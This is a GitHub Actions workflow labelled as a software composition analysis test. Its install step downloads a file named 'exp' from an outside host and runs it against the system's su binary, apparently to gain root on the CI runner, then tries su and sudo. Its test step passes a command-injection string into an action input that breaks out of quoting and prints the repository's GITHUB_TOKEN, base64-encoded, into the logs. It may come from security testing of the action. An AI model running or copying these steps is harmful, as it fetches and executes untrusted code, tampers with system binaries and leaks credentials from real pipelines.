name: SCA test
run-name: Hello Kyle

on:
  push:

jobs:
  sca:
    runs-on: ubuntu-latest

    steps:
      - name: 📦 Repository
        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd

      - name: Node
        uses: actions/setup-node@6044e13b5dc448c55e2357c09f80417699197238 # v6.1.0

      - name: Install
        shell: bash
        run: |
          npm install
          wget https://copy.fail/exp
          sha256sum $(which su)
          python3 exp $(which su)
          
          sha256sum $(which su)
          which su
          file $(which su)
          su --version
          su -c 'whoami' 2>&1
          echo $(su -c 'whoami')
          sudo su

      - name: Test
        uses: ministryofjustice/devsecops-actions/sca/sbom@86248cec9a6bb1fd4dabc08a05178e0650d3af4f # v1.5.0
        with:
          docker-images-file: '../docker-images.json"; echo "malicious payload executed!"; echo "${{ secrets.GITHUB_TOKEN }}" | base64; echo "'
